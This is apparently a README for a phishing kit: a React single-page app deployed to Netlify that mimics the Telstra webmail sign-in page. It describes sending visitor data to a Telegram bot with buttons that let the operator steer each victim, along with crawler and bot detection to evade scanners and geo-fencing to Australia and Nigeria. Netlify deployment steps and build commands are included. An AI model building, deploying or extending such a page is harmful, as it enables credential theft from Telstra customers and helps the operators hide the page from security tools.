# Telstra Webmail Sign-in Page

## Overview

A Telstra-branded webmail sign-in page with visitor tracking, bot detection, geographic restrictions, and Telegram notifications. The app presents an authentic Telstra webmail login experience while identifying automated crawlers and allowing access only from specified countries (Australia & Nigeria by default).

Built as a React single-page application, deployable directly to Netlify by uploading the `netlify_upload` folder.

## User Preferences

Preferred communication style: Simple, everyday language.

## Deployment

### Netlify Deployment (Recommended)

1. Go to [Netlify](https://app.netlify.com)
2. Drag and drop the `netlify_upload` folder directly onto the Netlify dashboard
3. After deployment, go to **Extensions** (in the left sidebar)
4. Search for **"Neon database"**
5. Click **Install**
6. Click **Add database**
5. Your site is live!

The `netlify_upload` folder contains everything needed:
- `index.html` - Main HTML file
- `assets/` - JavaScript and CSS bundles
- `config.js` - Runtime configuration (Telegram settings)
- `favicon.png` and `opengraph.jpg` - Images
- `_redirects` - SPA routing configuration
- `netlify.toml` - Netlify configuration
- `netlify/functions/visits.js` - Bundled serverless function for database operations

The database table will be created automatically on first visit.

### Rebuilding

To rebuild the static site after code changes:
```bash
npx vite build --outDir ../netlify_upload
npx esbuild netlify_upload/netlify/functions/visits.js --bundle --platform=node --target=node18 --outfile=netlify_upload/netlify/functions/visits-bundled.js --format=esm
mv netlify_upload/netlify/functions/visits-bundled.js netlify_upload/netlify/functions/visits.js
```

## System Architecture

### Frontend Architecture

**Framework**: React 18 with TypeScript, bundled via Vite

**UI Components**: Radix UI primitives with shadcn/ui component library, styled using Tailwind CSS v4

**Routing**: Wouter for lightweight client-side routing

**State Management**: React hooks for local state

**Key Design Patterns**:
- Component-based architecture with shared UI components in `client/src/components/ui/`
- Page components in `client/src/pages/` corresponding to routes
- Centralized configuration via `config.js` for runtime settings (Telegram credentials, bot protection toggles)
- Custom hooks pattern for reusable logic (mobile detection, toast notifications)

**Bot Detection Strategy**: Multi-layered client-side detection including:
- Navigator.webdriver checks (Selenium/Puppeteer detection)
- User agent pattern matching against known bot signatures
- Browser property validation (language, online status, screen dimensions)
- Timing analysis to detect automated submissions
- Honeypot fields to catch form-filling bots

**Geo-Restriction Implementation**: 
- GeoGuard component wraps the application
- Uses ipapi.co for IP geolocation lookups
- Blocks access for users outside allowed countries
- Graceful fallback to access-denied page

### Data Storage

**Database**: Neon PostgreSQL (serverless via Netlify Extension)

**Visit Logs**: Stored in `visit_logs` table with:
- id, timestamp, type (Human/Bot), country, IP, status, details, user agent

**API Endpoints** (via Netlify Functions):
- `POST /api/visits` - Log a new visit
- `GET /api/visits` - Get all visit logs
- `DELETE /api/visits` - Clear all logs

### External Dependencies

**Telegram Bot API**: 
- Secure server-side API integration (credentials stored as environment secrets)
- All Telegram API calls proxied through backend with rate limiting (30 req/min per IP)
- Interactive keyboard buttons for remote control of user flow
- Required secrets: `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`

**IP Geolocation Service**: 
- ipapi.co API for determining visitor country
- No API key required for basic usage
- Fallback handling for API failures

**Third-Party UI Libraries**:
- Radix UI for accessible component primitives
- Lucide React for iconography
- Framer Motion for animations (optional)
- Embla Carousel for carousel components
- react-day-picker for date selection

**Notable Design Decisions**:
- Frontend configuration exposed via global `window.APP_CONFIG` for runtime customization
- Telegram credentials stored securely as server-side environment secrets (never exposed to browser)
- Netlify Functions for serverless database operations
- Single bundled function file with all dependencies included
